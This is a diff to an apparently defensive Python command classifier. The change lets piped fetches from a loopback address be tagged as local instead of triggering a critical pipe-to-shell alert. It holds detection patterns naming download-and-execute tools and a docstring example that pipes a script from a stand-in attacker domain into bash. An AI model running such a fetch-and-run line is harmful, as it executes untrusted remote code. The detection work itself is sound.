@@ -26,6 +26,16 @@ RAW_IP_URL = re.compile(r"https?://((?:\d{1,3}\.){3}\d{1,3})")
 # Loopback is not ingress — fetching your own orchestrator's health endpoint
 # must not read as a download cradle (see rules.py for the war story).
 LOOPBACK_IP = re.compile(r"^(?:127(?:\.\d{1,3}){3}|0\.0\.0\.0)$")
+# Every URL host in a command, so a pipe-to-interpreter can be judged by where it
+# actually points rather than by shape alone.
+URL_HOST = re.compile(r"https?://(\[[0-9a-f:]+\]|[^/\s:'\"]+)", re.IGNORECASE)
+# The same machine, spelled the several ways people spell it. `0.0.0.0` is here
+# because curling your own bound service by that address is common, even though
+# it means "all interfaces" when binding rather than when connecting.
+LOOPBACK_HOST = re.compile(
+    r"^(?:127(?:\.\d{1,3}){3}|0\.0\.0\.0|localhost|\[::1\]|\[::ffff:127(?:\.\d{1,3}){3}\])$",
+    re.IGNORECASE,
+)
 DOWNLOAD_EXEC = re.compile(
     r"downloadstring|downloadfile|invoke-webrequest|\biwr\b|\bcurl\b|\bwget\b|"
     r"certutil|bitsadmin|invoke-expression|\biex\b",
@@ -112,6 +122,7 @@ KNOWN_TRAITS = frozenset({
     "raw_ip_fetch",
     "encoded_cmd",
     "pipe_to_shell",
+    "pipe_to_shell_local",
     "cloud_api",
     "git_exfil",
     "staging_fetch",
@@ -122,6 +133,39 @@ KNOWN_TRAITS = frozenset({
     "pr_commit",
     "pr_merge",
 })
+
+
+def pipes_only_loopback(command: str) -> bool:
+    """True when every URL in a pipe-to-interpreter command points at this host.
+
+    `curl http://127.0.0.1:8000/api/v1/audit/status | python -c ...` has the exact
+    shape of a download cradle and none of the substance: nothing crosses the
+    network and nothing untrusted is executed. Querying your own dev server and
+    piping the JSON into an interpreter is a thing developers do several times an
+    hour, and this fired at critical on it.
+
+    That is not a cosmetic problem. A critical which fires several times a day on
+    normal work does not stay a critical: it becomes the alert people learn to
+    scroll past, and by the time a real cradle appears the rule has already lost
+    its reader. The DLP manifest records the same lesson from the other side,
+    where a bare 40-char pattern matched every git commit SHA.
+
+    Deliberately conservative in two ways.
+
+    Loopback is excluded specifically, rather than remote being required. An
+    earlier version of the rule demanded a bare IP address, which let
+    `curl https://evil-cdn.example.com/x.sh | bash` straight through -- and a
+    domain is what a real attacker uses. Any host that is not provably loopback
+    keeps the full-strength trait.
+
+    A command with no URL we can read is treated as remote. `curl $URL | bash`
+    resolves at runtime, so we cannot prove where it points, and guessing in the
+    quiet direction is how a recorder goes blind.
+    """
+    hosts = URL_HOST.findall(command or "")
+    if not hosts:
+        return False
+    return all(LOOPBACK_HOST.match(h) for h in hosts)
 
 
 def classify_command(command: str) -> list[str]:
@@ -136,7 +180,9 @@ def classify_command(command: str) -> list[str]:
     if ENCODED_CMD.search(command):
         traits.append("encoded_cmd")
     if PIPE_TO_SHELL.search(command):
-        traits.append("pipe_to_shell")
+        traits.append(
+            "pipe_to_shell_local" if pipes_only_loopback(command) else "pipe_to_shell"
+        )
     if CLOUD_API.search(command):
         traits.append("cloud_api")
     if GIT_EXFIL.search(command):
